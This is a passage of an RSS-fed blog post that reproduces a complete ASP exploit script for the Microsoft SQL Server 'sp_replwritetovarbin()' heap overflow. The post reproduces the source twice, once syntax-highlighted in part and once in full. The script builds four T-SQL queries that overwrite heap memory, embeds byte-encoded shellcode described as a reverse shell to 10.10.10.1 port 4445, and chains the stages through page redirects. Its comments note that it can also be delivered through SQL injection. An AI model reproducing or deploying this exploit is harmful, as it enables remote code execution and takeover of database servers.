<span class="st0">&quot;END&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;SET @buf = @buf + ''',''33'',''34'',''35'',''36'',''37'',''38'',''39'',''40'',''41''' &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;EXEC master..sp_executesql @buf&quot;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp;
&nbsp;
<span class="kw4">Set</span> oConnection = Server.<span class="kw2">CreateObject</span>(<span class="st0">&quot;ADODB.Connection&quot;</span>)
oConnection.<span class="kw4">Open</span> <span class="st0">&quot;Provider=SQLOLEDB; Data Source=; Initial Catalog=; User ID=&quot;</span> &amp; UserName &amp; <span class="st0">&quot;; Password=&quot;</span> &amp; Password
<span class="kw4">Set</span> rs = Server.<span class="kw2">CreateObject</span>(<span class="st0">&quot;ADODB.Recordset&quot;</span>)
&nbsp;
phase = Request.Querystring(<span class="st0">&quot;p&quot;</span>)
&nbsp;
<span class="kw3">if</span> phase <span class="kw3">then</span>
&nbsp; &nbsp; <span class="kw3">if</span> phase = 1 <span class="kw3">then</span>
&nbsp; &nbsp; &nbsp; &nbsp; rs.<span class="kw4">open</span> SQL3, oConnection
&nbsp; &nbsp; &nbsp; &nbsp; rs.<span class="kw3">close</span>
&nbsp; &nbsp; &nbsp; &nbsp; oConnection.<span class="kw3">Close</span>
&nbsp; &nbsp; &nbsp; &nbsp; <span class="kw4">Set</span> oConnection = <span class="kw5">Nothing</span>
&nbsp; &nbsp; &nbsp; &nbsp; Response.Redirect(<span class="st0">&quot;sql-exploit.asp?p=2&quot;</span>)
&nbsp; &nbsp; <span class="kw3">elseif</span> phase = 2 <span class="kw3">then</span>
&nbsp; &nbsp; &nbsp; &nbsp; rs.<span class="kw4">open</span> SQL4, oConnection
&nbsp; &nbsp; &nbsp; &nbsp; rs.<span class="kw3">close</span>
&nbsp; &nbsp; &nbsp; &nbsp; oConnection.<span class="kw3">Close</span>
&nbsp; &nbsp; &nbsp; &nbsp; <span class="kw4">Set</span> oConnection = <span class="kw5">Nothing</span>
&nbsp; &nbsp; &nbsp; &nbsp; Response.Redirect(<span class="st0">&quot;sql-exploit.asp?p=3&quot;</span>)
&nbsp; &nbsp; <span class="kw3">end</span> <span class="kw3">if</span>
<span class="kw3">Else</span>
&nbsp; &nbsp; rs.<span class="kw4">open</span> SQL, oConnection
&nbsp; &nbsp; rs.<span class="kw3">close</span>
&nbsp; &nbsp; oConnection.<span class="kw3">Close</span>
&nbsp; &nbsp; <span class="kw4">Set</span> oConnection = <span class="kw5">Nothing</span>
&nbsp; &nbsp; 
&nbsp; &nbsp; <span class="kw4">Set</span> oConnection = Server.<span class="kw2">CreateObject</span>(<span class="st0">&quot;ADODB.Connection&quot;</span>)
&nbsp; &nbsp; oConnection.<span class="kw4">Open</span> <span class="st0">&quot;Provider=SQLOLEDB; Data Source=; Initial Catalog=; User ID=&quot;</span> &amp; UserName &amp; <span class="st0">&quot;; Password=&quot;</span> &amp; Password
&nbsp; &nbsp; <span class="kw4">Set</span> rs = Server.<span class="kw2">CreateObject</span>(<span class="st0">&quot;ADODB.Recordset&quot;</span>)
&nbsp; &nbsp; rs.<span class="kw4">open</span> SQL2, oConnection
&nbsp; &nbsp; rs.<span class="kw3">close</span>
&nbsp; &nbsp; oConnection.<span class="kw3">Close</span>
&nbsp; &nbsp; <span class="kw4">Set</span> oConnection = <span class="kw5">Nothing</span> &nbsp; 
&nbsp;
&nbsp; &nbsp; Response.Redirect(<span class="st0">&quot;sql-exploit.asp?p=1&quot;</span>)
<span class="kw3">end</span> <span class="kw3">if</span>
&nbsp;
&nbsp;
%&gt;</pre></td></tr></tbody></table></div>
<div class="bwp-syntax-source"><pre class="no-parse">// k`sOSe 12/17/2008
&lt;%// Microsoft SQL Server "sp_replwritetovarbin()" Heap Overflow
// Tested on Win2k SP4 with MSSQL 2000(on one box only!).
// Shellcode is a slightly modified metasploit reverse shell(on 10.10.10.1 port 4445),
// the change allows multiple shots <img src="https://s.w.org/images/core/emoji/2/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" />
// 
// You need a valid SQL account, but you can also use this through an SQL-Injection simply by injecting the T-SQL stuff.

// Take a look at the comments in T-SQL



On Error Resume Next

// change this
UserName = "r00t"
Password = "t00r"

// ########################################### FIRST QUERY
SQL = "DECLARE @buf NVARCHAR(4000),				"&amp;_
"@val NVARCHAR(4),						"&amp;_
"@counter INT							"&amp;_
"SET @buf = '							"&amp;_ 
"declare @retcode int,						"&amp;_
"@end_offset int,						"&amp;_
"@vb_buffer varbinary,						"&amp;_
"@vb_bufferlen int						"&amp;_  
"exec master.dbo.sp_replwritetovarbin 120, @end_offset output, @vb_buffer output, @vb_bufferlen output,''' "&amp;_
"SET @val = CHAR(0x41)						"&amp;_
"SET @counter = 0						"&amp;_
"WHILE @counter &lt; 3020						"&amp;_
"BEGIN								"&amp;_
"  SET @counter = @counter + 1					"&amp;_
"  IF @counter = 2900						"&amp;_	 
"  BEGIN							"&amp;_
"    SET @val =  CHAR(0x43)					"&amp;_
"  END								"&amp;_
"  ELSE IF @counter = 299					"&amp;_
"  BEGIN							"&amp;_
"    SET @val =  CHAR(0x42)					"&amp;_
"  END								"&amp;_
"  ELSE IF @counter = 300					"&amp;_
"  BEGIN							"&amp;_


"     /* First byte overwritten here. This is a random writable address */	"&amp;_
"     SET @buf = @buf + CHAR(0x44) + char(0xc0) + char(0x4c) + CHAR(0x19) "&amp;_
"     CONTINUE							"&amp;_
"  END								"&amp;_
"  SET @buf = @buf + @val					"&amp;_
"END								"&amp;_
"SET @buf = @buf + ''',''33'',''34'',''35'',''36'',''37'',''38'',''39'',''40'',''41'''   "&amp;_
"EXEC master..sp_executesql @buf"							





// ########################################### SECOND QUERY
SQL2 = "DECLARE @buf NVARCHAR(4000),				"&amp;_
"@val NVARCHAR(4),						"&amp;_
"@counter INT							"&amp;_
"SET @buf = '							"&amp;_ 
"declare @retcode int,						"&amp;_
"@end_offset int,						"&amp;_
"@vb_buffer varbinary,						"&amp;_
"@vb_bufferlen int						"&amp;_  
"exec master.dbo.sp_replwritetovarbin 120, @end_offset output, @vb_buffer output, @vb_bufferlen output,''' "&amp;_
"SET @val = CHAR(0x41)						"&amp;_
"SET @counter = 0						"&amp;_
"WHILE @counter &lt; 3097						"&amp;_
"BEGIN								"&amp;_
"  SET @counter = @counter + 1					"&amp;_
"  IF @counter = 2900						"&amp;_	 
"  BEGIN							"&amp;_
"    SET @val =  CHAR(0x43)					"&amp;_
"  END								"&amp;_
"  ELSE IF @counter = 299					"&amp;_
"  BEGIN							"&amp;_
"    SET @val =  CHAR(0x42)					"&amp;_
"  END								"&amp;_
"  ELSE IF @counter = 300					"&amp;_
"  BEGIN							"&amp;_


"     /* Second byte overwritten here */			"&amp;_
"     SET @buf = @buf + CHAR(0x45) + char(0xc0) + char(0x4c) + CHAR(0x19) "&amp;_
"     CONTINUE							"&amp;_
"  END								"&amp;_
"  SET @buf = @buf + @val					"&amp;_
"END								"&amp;_
"SET @buf = @buf + ''',''33'',''34'',''35'',''36'',''37'',''38'',''39'',''40'',''41'''   "&amp;_
"EXEC master..sp_executesql @buf"							





// ########################################### THIRD QUERY
SQL3 = "DECLARE @buf NVARCHAR(4000),				"&amp;_
"@val NVARCHAR(4),						"&amp;_
"@counter INT							"&amp;_
"SET @buf = '							"&amp;_ 
"declare @retcode int,						"&amp;_
"@end_offset int,						"&amp;_
"@vb_buffer varbinary,						"&amp;_
"@vb_bufferlen int						"&amp;_  
"exec master.dbo.sp_replwritetovarbin 120, @end_offset output, @vb_buffer output, @vb_bufferlen output,''' "&amp;_
"SET @val = CHAR(0x41)						"&amp;_
"SET @counter = 0						"&amp;_
"WHILE @counter &lt; 3021						"&amp;_
"BEGIN								"&amp;_
"  SET @counter = @counter + 1					"&amp;_
"  IF @counter = 2900						"&amp;_	 
"  BEGIN							"&amp;_
"    SET @val =  CHAR(0x43)					"&amp;_
"  END								"&amp;_
"  ELSE IF @counter = 299					"&amp;_
"  BEGIN							"&amp;_
"    SET @val =  CHAR(0x42)					"&amp;_
"  END								"&amp;_
"  ELSE IF @counter = 300					"&amp;_
"  BEGIN							"&amp;_


"     /* Third byte overwritten here */				"&amp;_
"     SET @buf = @buf + CHAR(0x46) + char(0xc0) + char(0x4c) + CHAR(0x19) "&amp;_
"     CONTINUE							"&amp;_
"  END								"&amp;_
"  SET @buf = @buf + @val					"&amp;_
"END								"&amp;_
"SET @buf = @buf + ''',''33'',''34'',''35'',''36'',''37'',''38'',''39'',''40'',''41'''   "&amp;_
"EXEC master..sp_executesql @buf"							





// ########################################### FOURTH QUERY
SQL4 = "DECLARE @buf NVARCHAR(4000),				"&amp;_
"@val NVARCHAR(4),						"&amp;_
"@counter INT							"&amp;_
"SET @buf = '							"&amp;_ 
"declare @retcode int,						"&amp;_
"@end_offset int,						"&amp;_
"@vb_buffer varbinary,						"&amp;_
"@vb_bufferlen int						"&amp;_  
"exec master.dbo.sp_replwritetovarbin 120, @end_offset output, @vb_buffer output, @vb_bufferlen output,''' "&amp;_
"SET @val = CHAR(0x41)						"&amp;_
"SET @counter = 0						"&amp;_
"WHILE @counter &lt; 2708						"&amp;_
"BEGIN								"&amp;_
"  SET @counter = @counter + 1					"&amp;_
"  IF @counter = 2900						"&amp;_	 
"  BEGIN							"&amp;_
"    SET @val =  CHAR(0x43)					"&amp;_
"  END								"&amp;_
"  IF @counter = 108						"&amp;_
"  BEGIN							"&amp;_


"     /* this is the pointer we wrote - 0x38. It points to a CALL ECX */	"&amp;_
"    SET @buf = @buf + CHAR(0x10) + CHAR(0xc0) + CHAR(0x4c) + CHAR(0x19) "&amp;_


"     /* realign code */						"&amp;_
"    SET @buf = @buf + CHAR(0xe1)				"&amp;_


"     /* realign the stack */					"&amp;_
"    SET @buf = @buf + CHAR(0x83) + CHAR(0xe4) + CHAR(0xfc)	"&amp;_


"     /* jump ahead */						"&amp;_
"    SET @buf = @buf + CHAR(0xe9) + CHAR(0xba) + CHAR(0x00) + CHAR(0x00) + CHAR(0x00) "&amp;_
"    SET @counter = @counter + 12				"&amp;_
"    CONTINUE							"&amp;_
"  END								"&amp;_
"  ELSE IF @counter = 299					"&amp;_
"  BEGIN							"&amp;_
"    SET @val =  CHAR(0x42)					"&amp;_
"  END								"&amp;_
"  ELSE IF @counter = 300					"&amp;_
"  BEGIN							"&amp;_


"     /* Fourth byte overwritten here */			"&amp;_
"     SET @buf = @buf + CHAR(0x47) + char(0xc0) + char(0x4c) + CHAR(0x19) "&amp;_


"     /* reverse shell on 10.10.10.1:4445 */			"&amp;_
"     SET @buf=@buf+CHAR(0xfc)+CHAR(0x6a)+CHAR(0xeb)+CHAR(0x4d)+CHAR(0xe8)+CHAR(0xf9)+CHAR(0xff)
+CHAR(0xff)+CHAR(0xff)+CHAR(0x60)+CHAR(0x8b)+CHAR(0x6c)+CHAR(0x24)+CHAR(0x24)+CHAR(0x8b)
+CHAR(0x45)+CHAR(0x3c)+CHAR(0x8b)+CHAR(0x7c)+CHAR(0x05)+CHAR(0x78)+CHAR(0x01)+CHAR(0xef)
+CHAR(0x8b)+CHAR(0x4f)+CHAR(0x18)+CHAR(0x8b)+CHAR(0x5f)+CHAR(0x20)+CHAR(0x01)+CHAR(0xeb)
+CHAR(0x49)+CHAR(0x8b)+CHAR(0x34)+CHAR(0x8b)+CHAR(0x01)+CHAR(0xee)+CHAR(0x31)+CHAR(0xc0)
+CHAR(0x99)+CHAR(0xac)+CHAR(0x84)+CHAR(0xc0)+CHAR(0x74)+CHAR(0x07)+CHAR(0xc1)+CHAR(0xca)
+CHAR(0x0d)+CHAR(0x01)+CHAR(0xc2)+CHAR(0xeb)+CHAR(0xf4)+CHAR(0x3b)+CHAR(0x54)+CHAR(0x24)
+CHAR(0x28)+CHAR(0x75)+CHAR(0xe5)+CHAR(0x8b)+CHAR(0x5f)+CHAR(0x24)+CHAR(0x01)+CHAR(0xeb)
+CHAR(0x66)+CHAR(0x8b)+CHAR(0x0c)+CHAR(0x4b)+CHAR(0x8b)+CHAR(0x5f)+CHAR(0x1c)+CHAR(0x01)
+CHAR(0xeb)+CHAR(0x03)+CHAR(0x2c)+CHAR(0x8b)+CHAR(0x89)+CHAR(0x6c)+CHAR(0x24)+CHAR(0x1c)
+CHAR(0x61)+CHAR(0xc3)+CHAR(0x31)+CHAR(0xdb)+CHAR(0x64)+CHAR(0x8b)+CHAR(0x43)+CHAR(0x30)
+CHAR(0x8b)+CHAR(0x40)+CHAR(0x0c)+CHAR(0x8b)+CHAR(0x70)+CHAR(0x1c)+CHAR(0xad)+CHAR(0x8b)
+CHAR(0x40)+CHAR(0x08)+CHAR(0x5e)+CHAR(0x68)+CHAR(0x8e)+CHAR(0x4e)+CHAR(0x0e)+CHAR(0xec)
+CHAR(0x50)+CHAR(0xff)+CHAR(0xd6)+CHAR(0x66)+CHAR(0x53)+CHAR(0x66)+CHAR(0x68)+CHAR(0x33)
+CHAR(0x32)+CHAR(0x68)+CHAR(0x77)+CHAR(0x73)+CHAR(0x32)+CHAR(0x5f)+CHAR(0x54)+CHAR(0xff)
+CHAR(0xd0)+CHAR(0x68)+CHAR(0xcb)+CHAR(0xed)+CHAR(0xfc)+CHAR(0x3b)+CHAR(0x50)+CHAR(0xff)
+CHAR(0xd6)+CHAR(0x5f)+CHAR(0x89)+CHAR(0xe5)+CHAR(0x66)+CHAR(0x81)+CHAR(0xed)+CHAR(0x08)
+CHAR(0x02)+CHAR(0x55)+CHAR(0x6a)+CHAR(0x02)+CHAR(0xff)+CHAR(0xd0)+CHAR(0x68)+CHAR(0xd9)
+CHAR(0x09)+CHAR(0xf5)+CHAR(0xad)+CHAR(0x57)+CHAR(0xff)+CHAR(0xd6)+CHAR(0x53)+CHAR(0x53)
+CHAR(0x53)+CHAR(0x53)+CHAR(0x43)+CHAR(0x53)+CHAR(0x43)+CHAR(0x53)+CHAR(0xff)+CHAR(0xd0)
+CHAR(0x68)+CHAR(0x0a)+CHAR(0x0a)+CHAR(0x0a)+CHAR(0x01)+CHAR(0x66)+CHAR(0x68)+CHAR(0x11)
+CHAR(0x5d)+CHAR(0x66)+CHAR(0x53)+CHAR(0x89)+CHAR(0xe1)+CHAR(0x95)+CHAR(0x68)+CHAR(0xec)
+CHAR(0xf9)+CHAR(0xaa)+CHAR(0x60)+CHAR(0x57)+CHAR(0xff)+CHAR(0xd6)+CHAR(0x6a)+CHAR(0x10)
+CHAR(0x51)+CHAR(0x55)+CHAR(0xff)+CHAR(0xd0)+CHAR(0x66)+CHAR(0x6a)+CHAR(0x64)+CHAR(0x66)
+CHAR(0x68)+CHAR(0x63)+CHAR(0x6d)+CHAR(0x6a)+CHAR(0x50)+CHAR(0x59)+CHAR(0x29)+CHAR(0xcc)
+CHAR(0x89)+CHAR(0xe7)+CHAR(0x6a)+CHAR(0x44)+CHAR(0x89)+CHAR(0xe2)+CHAR(0x31)+CHAR(0xc0)
+CHAR(0xf3)+CHAR(0xaa)+CHAR(0x95)+CHAR(0x89)+CHAR(0xfd)+CHAR(0xfe)+CHAR(0x42)+CHAR(0x2d)
+CHAR(0xfe)+CHAR(0x42)+CHAR(0x2c)+CHAR(0x8d)+CHAR(0x7a)+CHAR(0x38)+CHAR(0xab)+CHAR(0xab)
+CHAR(0xab)+CHAR(0x68)+CHAR(0x72)+CHAR(0xfe)+CHAR(0xb3)+CHAR(0x16)+CHAR(0xff)+CHAR(0x75)
+CHAR(0x28)+CHAR(0xff)+CHAR(0xd6)+CHAR(0x5b)+CHAR(0x57)+CHAR(0x52)+CHAR(0x51)+CHAR(0x51)
+CHAR(0x51)+CHAR(0x6a)+CHAR(0x01)+CHAR(0x51)+CHAR(0x51)+CHAR(0x55)+CHAR(0x51)+CHAR(0xff)
+CHAR(0xd0)+CHAR(0x68)+CHAR(0xad)+CHAR(0xd9)+CHAR(0x05)+CHAR(0xce)+CHAR(0x53)+CHAR(0xff)
+CHAR(0xd6)+CHAR(0x6a)+CHAR(0xff)+CHAR(0xff)+CHAR(0x37)+CHAR(0xff)+CHAR(0xd0)+CHAR(0x68)
+CHAR(0xe7)+CHAR(0x79)+CHAR(0xc6)+CHAR(0x79)+CHAR(0xff)+CHAR(0x75)+CHAR(0x04)+CHAR(0xff)
+CHAR(0xd6)+CHAR(0xff)+CHAR(0x77)+CHAR(0xfc)+CHAR(0xff)+CHAR(0xd0)+CHAR(0x68)+CHAR(0xef)
+CHAR(0xce)+CHAR(0xe0)+CHAR(0x60)+CHAR(0x53)+CHAR(0xff)+CHAR(0xd6)		"&amp;_
"     CONTINUE							"&amp;_
"  END								"&amp;_
"  SET @buf = @buf + @val					"&amp;_
"END								"&amp;_
"SET @buf = @buf + ''',''33'',''34'',''35'',''36'',''37'',''38'',''39'',''40'',''41'''   "&amp;_
"EXEC master..sp_executesql @buf"							


Set oConnection = Server.CreateObject("ADODB.Connection")
oConnection.Open "Provider=SQLOLEDB; Data Source=; Initial Catalog=; User ID=" &amp; UserName &amp; "; Password=" &amp; Password
Set rs = Server.CreateObject("ADODB.Recordset")

phase = Request.Querystring("p")

if phase then
	if phase = 1 then
		rs.open SQL3, oConnection
		rs.close
		oConnection.Close
		Set oConnection = Nothing
		Response.Redirect("sql-exploit.asp?p=2")
	elseif phase = 2 then
		rs.open SQL4, oConnection
		rs.close
		oConnection.Close
		Set oConnection = Nothing
		Response.Redirect("sql-exploit.asp?p=3")
	end if
Else
	rs.open SQL, oConnection
	rs.close
	oConnection.Close
	Set oConnection = Nothing
	
	Set oConnection = Server.CreateObject("ADODB.Connection")
	oConnection.Open "Provider=SQLOLEDB; Data Source=; Initial Catalog=; User ID=" &amp; UserName &amp; "; Password=" &amp; Password
	Set rs = Server.CreateObject("ADODB.Recordset")
	rs.open SQL2, oConnection
	rs.close
	oConnection.Close
	Set oConnection = Nothing	

	Response.Redirect("sql-exploit.asp?p=1")
end if


%&gt;</pre></div></div>

]]></content:encoded>
			<wfw:commentRss>/index.php/datamgmt/datadesign/sp_replwritetovarbin-heap-overflow-code/feed/</wfw:commentRss>
		<slash:comments>5</slash:comments>
		</item>
	</channel>
</rss>
